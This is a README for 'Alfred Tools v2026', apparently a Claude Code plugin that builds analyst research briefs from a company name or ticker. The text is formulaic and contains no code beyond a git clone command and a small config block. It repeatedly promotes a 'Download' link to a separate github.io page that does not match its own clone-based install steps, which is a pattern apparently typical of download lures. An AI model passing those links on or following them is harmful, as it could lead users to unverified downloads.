# Alfred Tools v2026 - analyst research toolkit 2026

> **Alfred Tools converts a company name or ticker into a banker-grade research brief on Claude Code, combining sourced facts, live market context, and export-ready outputs in version 2026.**

[![Platform](https://img.shields.io/badge/Platform-Claude%20Code-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/owen-ward2005/alfred-tools-analyst-brief?style=flat-square)](https://github.com/owen-ward2005/alfred-tools-analyst-brief)

---

<p align="center">
  <a href="https://owen-ward2005.github.io/alfred-tools-analyst-brief/">
    <img src="https://img.shields.io/badge/Download-Alfred%20Tools%20Latest-brightgreen?style=for-the-badge" alt="Download Alfred Tools">
  </a>
</p>

> **[Direct Download - Alfred Tools v2026](https://owen-ward2005.github.io/alfred-tools-analyst-brief/)**

---

[Download Latest Build](https://owen-ward2005.github.io/alfred-tools-analyst-brief/)

---

## Overview

Alfred Tools is a Claude Code plugin created for analyst-oriented research workflows. Given a company name or ticker, it produces a structured brief that pulls together sourced facts, market context, trading comparables, news flow, and earnings highlights in one consolidated output.

It is intended for local cloned repository setups, which makes it a good fit for repeatable research and development workflows. The toolkit can export results as either a web view or a print-ready PDF, so the final brief is easy to review in a browser or archive as a document.

---

## What it does

- Turns a company name or ticker into a structured research brief
- Brings in sourced facts to anchor the analysis
- Adds live market context for up-to-date reference
- Covers trading comps, news, and earnings takeaways
- Exports results in a web-friendly format for browser review
- Creates PDF output for printing and sharing
- Stores finished briefs in a searchable research library
- Operates as a Claude Code plugin in a local repository workflow

---

## Installation

Clone the repository into your local workspace and open it in your Claude Code environment:

```bash
git clone https://github.com/owen-ward2005/alfred-tools-analyst-brief.git alfred-tools-v2026-brief
cd alfred-tools-v2026-brief
```

Once the repository is in place, load the plugin using your Claude Code setup and begin a brief from a company name or ticker.

---

## Usage

A typical workflow looks like this:

1. Open the cloned repository in Claude Code.
2. Start a new research brief with a company name or ticker.
3. Review the sourced facts, market context, and supporting sections.
4. Export the finished brief to the web format or PDF.
5. Store completed work in the research library for later lookup.

Example prompt pattern:

- `Create a research brief for AAPL`
- `Generate a company analysis for NVIDIA`
- `Build a ticker lookup brief for MSFT`

---

## Configuration

Configuration is managed in the local repository and through your Claude Code plugin setup. If your workflow relies on project settings, keep them alongside the repository so briefs and exports stay consistent from run to run.

Common items to manage include:

```json
{
  "outputFormats": ["web", "pdf"],
  "libraryPath": "./research-library",
  "sourceMode": "sourced-facts",
  "marketContext": "live"
}
```

Tune paths and output preferences to fit your local environment and document workflow.

---

## Requirements

- Claude Code environment
- Local cloned repository
- Access to a working research workflow for company and ticker lookups
- Storage space for exported briefs and research library entries
- A browser or PDF viewer for reviewing generated outputs

---

## FAQ

**How do I start a new brief?**  
Use a company name or ticker as the input, then let Alfred Tools assemble the report.

**Where are completed briefs stored?**  
They are saved in the research library inside your local project workflow.

**Can I export the result?**  
Yes. Alfred Tools supports both web export and PDF export.

**What if I need to update the setup?**  
Pull the latest repository changes and reload the plugin in Claude Code.

**Where should I look for configuration issues?**  
Check the local repository settings and your Claude Code integration if outputs are missing or incomplete.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
